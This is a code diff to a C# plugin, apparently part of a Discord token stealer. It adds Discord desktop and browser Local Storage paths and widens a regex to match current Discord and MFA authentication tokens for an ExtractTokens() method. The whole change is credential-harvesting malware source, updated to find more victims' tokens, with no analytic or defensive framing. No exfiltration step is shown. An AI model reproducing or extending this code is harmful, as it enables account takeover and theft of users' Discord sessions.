@@ -9,17 +9,28 @@ namespace Plugin.Messaging
     {
         private static readonly string[] DiscordPaths = new string[]
         {
+            // Updated Discord desktop paths for 2025 (LOCALAPPDATA is primary now)
+            "%LOCALAPPDATA%\\Discord\\Local Storage\\leveldb",
+            "%LOCALAPPDATA%\\DiscordCanary\\Local Storage\\leveldb",
+            "%LOCALAPPDATA%\\DiscordPTB\\Local Storage\\leveldb",
+            "%LOCALAPPDATA%\\DiscordDevelopment\\Local Storage\\leveldb",
+            // Legacy APPDATA paths (still check for older installations)
             "%APPDATA%\\discord\\Local Storage\\leveldb",
             "%APPDATA%\\discordcanary\\Local Storage\\leveldb",
             "%APPDATA%\\discordptb\\Local Storage\\leveldb",
             "%APPDATA%\\discorddevelopment\\Local Storage\\leveldb",
+            // Browser Discord web tokens
             "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
             "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
             "%APPDATA%\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
             "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"
         };
         
-        private static readonly Regex TokenRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", RegexOptions.Compiled);
+        // Updated token regex for 2025 - Discord changed format in 2023
+        // Old format: 24.6.27 characters (pre-2023)
+        // New format: 26+.6+.38+ characters (2023+)
+        // MFA format: mfa.84+ characters
+        private static readonly Regex TokenRegex = new Regex(@"[\w-]{26,}\.[\w-]{6,}\.[\w-]{38,}|mfa\.[\w-]{84,}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
         
         public static List<string> ExtractTokens()
         {
